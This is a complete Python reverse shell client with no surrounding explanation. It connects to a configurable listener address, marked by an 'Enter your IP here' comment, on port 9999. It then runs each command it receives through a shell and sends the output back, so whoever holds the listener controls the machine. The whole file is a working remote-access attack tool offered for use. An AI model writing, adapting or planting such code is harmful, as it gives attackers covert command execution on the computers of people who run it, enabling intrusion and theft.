import os, socket, subprocess, sys, re

def create_socket():
    try:
        global host_ip
        global port
        global sock

        host_ip = "127.0.0.1" #Enter your IP here.
        port = 9999
        sock = socket.socket()
    except:
        print("An error occured! ", str(socket.error))

def connect():
    try:
        global host_ip
        global port
        global sock

        sock.connect((host_ip,port))
        print("Connection established!")
    except:
        print("Connection error! ", str(socket.error))

def receive_cmd():
    global sock
    try:
        while True:
            data = sock.recv(1024)
            print(data.decode())
            if re.search("exit", data.decode(), re.IGNORECASE):
                sock.close()
                os._exit(0)
            if data[:2].decode() == "cd":
                os.chdir(data[3:].decode())
            if len(data) > 0:
                cmd = subprocess.Popen(data[:].decode(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_string = str(output_bytes)
                sock.send(str.encode(output_string + str(os.getcwd()) + '> '))
                print(output_string)
        sock.close()
    except:
        sock.send(str.encode("An error occured! Check your input."))
        receive_cmd()

create_socket()
connect()
receive_cmd()
